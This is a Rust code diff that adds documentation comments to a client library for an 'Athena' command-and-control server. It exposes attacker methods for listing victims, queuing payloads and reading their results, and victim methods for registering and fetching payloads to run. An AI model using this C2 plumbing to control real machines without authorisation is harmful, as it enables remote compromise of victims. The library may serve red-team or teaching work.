@@ -30,6 +30,7 @@ use payload::attack::Password;
 use payload::*;
 
 #[derive(Clone, Default)]
+/// Client builder
 pub struct AthenaClientBuilder {
     client: Option<Client>,
     host: Option<String>,
@@ -37,16 +38,20 @@ pub struct AthenaClientBuilder {
 }
 
 impl AthenaClientBuilder {
+    /// Set password to access athena C2 server
     pub fn password(&mut self, password: String) -> &mut Self {
         self.password = Some(Password { password });
         self
     }
 
+    /// Provide client configuration
     pub fn client(&mut self, client: ClientBuilder) -> AthenaResult<&mut Self> {
         let client = client.cookie_store(true).build()?;
         self.client = Some(client);
         Ok(self)
     }
+
+    // Set athena C2 server host
     pub fn host(&mut self, host: String) -> &mut Self {
         if host.ends_with('/') {
             self.host = Some(host[0..host.len() - 1].to_owned())
@@ -56,6 +61,7 @@ impl AthenaClientBuilder {
         self
     }
 
+    // Build client
     pub fn build(&mut self) -> AthenaResult<AthenaClient> {
         Ok(AthenaClient {
             client: self.client.clone().unwrap(),
@@ -66,6 +72,9 @@ impl AthenaClientBuilder {
 }
 
 #[derive(Clone)]
+/// AthenaClient contains methods that are useful to both attackers and victims
+/// Methods applicable to the attacker role are prefixed with "attacker"
+/// Methods applicable to the victim role are prefixed with "victim"
 pub struct AthenaClient {
     client: Client,
     host: Url,
@@ -73,6 +82,7 @@ pub struct AthenaClient {
 }
 
 impl AthenaClient {
+    /// Attacker: Get list of all victims currently available on the C2 server
     pub async fn attack_list_victims(&self) -> AthenaResult<Vec<attack::Victim>> {
         let url = self.host.clone().join(V1_ROUTES.attack.list_victims)?;
         Ok(self
@@ -85,6 +95,9 @@ impl AthenaClient {
             .await?)
     }
 
+    /// Attacker: Set payload that needs to be executed on a victim machine
+    /// A unique payload ID is returned. This ID is required to access the
+    /// payload's result
     pub async fn attack_set_payload(
         &self,
         payload: &attack::Payload,
@@ -99,6 +112,8 @@ impl AthenaClient {
         }
     }
 
+    /// Attacker: Read result that was submitted by a victim machine.
+    /// Results are mapped against the payload ID.
     pub async fn attack_read_response(
         &self,
         payload: &attack::PayloadID,
@@ -117,16 +132,20 @@ impl AthenaClient {
         }
     }
 
+    /// Attacker: Get configured password of the C2 server
     pub fn get_password(&self) -> &str {
         &self.password.password
     }
 
+    /// Victim: Register victim on the C2 server
     pub async fn victim_register(&self) -> AthenaResult<()> {
         let url = self.host.clone().join(V1_ROUTES.victim.join)?;
         self.client.post(url).send().await?;
         Ok(())
     }
 
+    /// Victim: Get all payloads that are yet to be executed on the victim machine.
+    /// Yet to be executed = No response submitted yet.
     pub async fn victim_get_paylod(&self) -> AthenaResult<victim::PayloadCollection> {
         let url = self.host.clone().join(V1_ROUTES.victim.get_payload)?;
         //        Ok(self.client.post(url).send().await?.json().await?)
@@ -141,6 +160,7 @@ impl AthenaClient {
         }
     }
 
+    /// Victim: Submit payload's result
     pub async fn victim_set_payload_response(
         &self,
         payload: &victim::PayloadResult,
@@ -160,8 +180,10 @@ impl AthenaClient {
 
 #[derive(Serialize, Error, Display, Debug, Deserialize)]
 #[cfg(not(tarpaulin_include))]
+/// Error value returned from the C2 server
 pub struct ErrorToResponse {
     pub error: String,
 }
 
+/// Result datatype used in libathena
 pub type AthenaResult<T> = Result<T, Box<dyn Error>>;
